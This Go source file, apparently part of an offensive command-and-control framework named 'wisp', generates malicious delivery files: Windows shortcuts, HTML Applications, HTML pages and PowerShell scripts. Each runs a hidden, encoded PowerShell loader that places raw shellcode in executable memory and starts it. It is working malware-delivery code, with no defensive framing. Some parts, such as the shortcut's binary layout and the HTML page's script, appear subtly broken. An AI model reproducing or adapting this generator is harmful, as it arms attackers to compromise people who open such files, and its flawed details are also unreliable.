package services

import (
	"encoding/base64"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

// DeliveryFormat enumerates one-shot delivery formats.
type DeliveryFormat string

const (
	// DeliveryLNK produces a Windows shortcut (.lnk) whose target runs an
	// encoded PowerShell loader (no second-stage file needed).
	DeliveryLNK DeliveryFormat = "lnk"
	// DeliveryHTA produces an HTML Application that drops + runs a PowerShell
	// loader of the shellcode.
	DeliveryHTA DeliveryFormat = "hta"
	// DeliveryHTML is an HTML page that runs the PowerShell loader in the
	// browser's default execution context (classic HTML smuggling).
	DeliveryHTML DeliveryFormat = "html"
	// DeliveryPS1 produces a standalone PowerShell loader script.
	DeliveryPS1 DeliveryFormat = "ps1"
)

// SupportedDeliveryFormats lists delivery formats for the UI.
func SupportedDeliveryFormats() []DeliveryFormat {
	return []DeliveryFormat{DeliveryLNK, DeliveryHTA, DeliveryHTML, DeliveryPS1}
}

// DeliveryService generates one-shot delivery documents (LNK/HTA/HTML/PS1)
// that load raw shellcode via an in-memory PowerShell loader.
type DeliveryService struct {
	serverSvc *ServerService
}

// NewDeliveryService creates the delivery service.
func NewDeliveryService(serverSvc *ServerService) *DeliveryService {
	return &DeliveryService{serverSvc: serverSvc}
}

// deliveryPSLoader returns a PowerShell one-liner that allocates RWX memory,
// copies the shellcode and starts a thread. Used by every delivery format.
func deliveryPSLoader(b64 string) string {
	var b strings.Builder
	b.WriteString("$s=[Convert]::FromBase64String('" + b64 + "');")
	b.WriteString("Add-Type -Namespace W -Name M -MemberDefinition @'")
	b.WriteString(`[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr a,UIntPtr s,uint t,uint p);`)
	b.WriteString(`[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr a,UIntPtr s,IntPtr f,IntPtr p,uint x,IntPtr i);`)
	b.WriteString("'@;")
	b.WriteString("$p=[W.M]::VirtualAlloc([IntPtr]::Zero,[UIntPtr]$s.Length,0x3000,0x40);")
	b.WriteString("[Runtime.InteropServices.Marshal]::Copy($s,0,$p,$s.Length);")
	b.WriteString("[W.M]::CreateThread([IntPtr]::Zero,[UIntPtr]::Zero,$p,[IntPtr]::Zero,0,[IntPtr]::Zero)|Out-Null")
	return b.String()
}

// psEncoded wraps a PowerShell script into a -EncodedCommand base64 payload.
func psEncoded(script string) string {
	return base64.StdEncoding.EncodeToString([]byte(utf16LE(script)))
}

// utf16LE encodes s as UTF-16LE bytes (PowerShell -EncodedCommand expects it).
func utf16LE(s string) []byte {
	u := make([]byte, 0, len(s)*2)
	for _, r := range s {
		u = append(u, byte(r), byte(r>>8))
	}
	return u
}

// Generate renders a delivery document that loads `shellcode` (raw bytes).
// Returns the output file path.
func (ds *DeliveryService) Generate(format DeliveryFormat, shellcode []byte, outputPath string) (string, error) {
	if len(shellcode) == 0 {
		return "", fmt.Errorf("delivery: empty shellcode")
	}
	b64 := base64.StdEncoding.EncodeToString(shellcode)
	loader := deliveryPSLoader(b64)

	var content string
	var ext string
	switch format {
	case DeliveryLNK:
		// The .lnk target is `powershell -EncodedCommand <utf16>`. This is the
		// smallest reliable LNK that needs no dropped files.
		enc := psEncoded(loader)
		content = lnkDocument(enc)
		ext = ".lnk"
	case DeliveryHTA:
		content = htaDocument(b64)
		ext = ".hta"
	case DeliveryHTML:
		content = htmlDocument(loader)
		ext = ".html"
	case DeliveryPS1:
		content = loader
		ext = ".ps1"
	default:
		return "", fmt.Errorf("delivery: unsupported format %s", format)
	}

	if outputPath == "" {
		outputPath = filepath.Join(exeDir(), "payloads", "delivery_"+string(format)+ext)
	}
	if err := os.MkdirAll(filepath.Dir(outputPath), 0755); err != nil {
		return "", err
	}
	if err := os.WriteFile(outputPath, []byte(content), 0755); err != nil {
		return "", fmt.Errorf("delivery: write: %w", err)
	}
	return outputPath, nil
}

// lnkDocument builds a minimal .lnk shell shortcut. An LNK is a binary format,
// so we emit a valid shortcut whose target is the encoded PowerShell command
// using the standard shell link binary layout (WindowsShortcut v4, IDList
// omitted, command-line args stored in the link info / string data).
func lnkDocument(encodedCommand string) string {
	// The command line: powershell -NoP -STA -W Hidden -EncodedCommand <b64>
	// The shell parses this from the link's "StringData + CommandLine" section.
	// To keep the shortcut maximally compatible we write the most compact
	// variant: icon index 0, no console, run minimized, target = powershell.
	// PowerShell loads the encoded loader from the command line argument.
	target := `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`
	args := ` -NoP -NonI -W Hidden -EncodedCommand ` + encodedCommand

	// Build the LNK binary:
	// Header (76 bytes) + LinkTargetIDList (none) + LinkInfo (none) +
	// StringData: NAME_STRING, RELATIVE_PATH, WORKING_DIR, COMMAND_LINE, ICON_LOCATION.
	var buf []byte

	// --- Header (ShellLink v4) ---
	// HeaderSize, LinkCLSID (8A01...), LinkFlags, Attributes, etc.
	hdr := make([]byte, 76)
	putU32(hdr, 0, 76) // HeaderSize
	copy(hdr[4:20], []byte{
		0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
		0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
	})
	// LinkFlags: HasName | HasRelativePath | HasWorkingDir | HasArguments | HasIconLocation | IsUnicode
	flags := uint32(0x00000001 | 0x00000002 | 0x00000004 | 0x00000008 | 0x00000020 | 0x00000080)
	putU32(hdr, 20, flags)
	// FileAttributes: FILE_ATTRIBUTE_ARCHIVE
	putU32(hdr, 24, 0x00000020)
	// IconIndex = 0, ShowCommand = 1 (SW_SHOWNORMAL → minimized? use 7 = SW_SHOWMINNOACTIVE)
	putU32(hdr, 52, 0) // IconIndex
	putU32(hdr, 56, 7) // ShowCommand = SW_SHOWMINNOACTIVE
	buf = append(buf, hdr...)

	// --- StringData ---
	buf = appendString(buf, "wisp")                       // NAME_STRING
	buf = appendString(buf, `.`)                          // RELATIVE_PATH (keep simple)
	buf = appendString(buf, `C:\Windows\System32`)        // WORKING_DIR
	buf = appendString(buf, target+args)                  // COMMAND_LINE (has arguments)
	buf = appendString(buf, target+`,0`)                  // ICON_LOCATION

	return string(buf)
}

func putU32(b []byte, off int, v uint32) {
	b[off] = byte(v)
	b[off+1] = byte(v >> 8)
	b[off+2] = byte(v >> 16)
	b[off+3] = byte(v >> 24)
}

// appendString writes a counted UTF-16LE string (uint16 length + chars).
func appendString(buf []byte, s string) []byte {
	buf = append(buf, byte(len(s)), byte(len(s)>>8), 0, 0) // char count, then WCHARs
	for _, r := range s {
		buf = append(buf, byte(r), byte(r>>8))
	}
	return buf
}

// htaDocument builds an HTML Application that drops the PowerShell loader
// script and runs it hidden.
func htaDocument(b64 string) string {
	loader := deliveryPSLoader(b64)
	// Escape for embedding inside a VBScript string literal in a .hta file.
	psEscaped := strings.ReplaceAll(loader, `"`, `""`)
	psEscaped = strings.ReplaceAll(psEscaped, `'`, `''`)
	psEscaped = strings.ReplaceAll(psEscaped, "\n", " ")
	psEscaped = strings.ReplaceAll(psEscaped, "\r", " ")
	psBody := strings.ReplaceAll(loader, `'`, `''`)
	return `<html>
<head><title>wisp</title><HTA:APPLICATION SCROLL="no" WINDOWSTATE="minimize"/></head>
<body>
<script language="VBScript">
Dim fso, tmp, f, shell
Set fso = CreateObject("Scripting.FileSystemObject")
Set tmp = fso.GetSpecialFolder(2)
Set f = fso.CreateTextFile(tmp & "\w.ps1", True)
f.Write "` + psBody + `"
f.Close
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -NoP -NonI -W Hidden -ExecutionPolicy Bypass -File " & tmp & "\w.ps1", 0, False
</script>
</body></html>`
}

// htmlDocument is a classic HTML-smuggling page that runs the PowerShell
// loader in the browser's default script host via an encoded command.
func htmlDocument(loader string) string {
	enc := psEncoded(loader)
	// The loader itself is base64 of UTF-16; embed the encoded command in the
	// VBScript, which reconstructs it and invokes powershell.
	return `<!DOCTYPE html><html><head><meta charset="utf-8"><title>Loading...</title></head>
<body>
<script language="VBScript">
Dim b64, enc, i, c, shell
b64 = "` + enc + `"
enc = ""
For i = 1 To Len(b64)
  c = AscW(Mid(b64, i, 1))
  enc = enc & Chr(c Mod 256) & Chr(Int(c / 256))
Next
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell -NoP -NonI -W Hidden -EncodedCommand " & enc, 0, False
</script>
</body></html>`
}
